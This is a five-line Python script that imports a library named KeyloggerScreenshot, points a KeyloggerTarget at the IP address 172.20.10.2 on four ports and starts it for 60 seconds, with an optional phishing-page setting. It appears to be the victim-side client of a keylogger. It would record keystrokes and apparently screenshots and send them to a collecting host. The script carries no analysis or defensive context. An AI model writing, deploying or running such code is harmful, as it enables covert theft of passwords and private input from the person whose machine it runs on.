import KeyloggerScreenshot as ks 

ip = '172.20.10.2'
key_client = ks.KeyloggerTarget(ip, 3546, ip, 2736, ip, 4213, ip, 8941, duration_in_seconds=60, phishing_web=None) 
key_client.start()
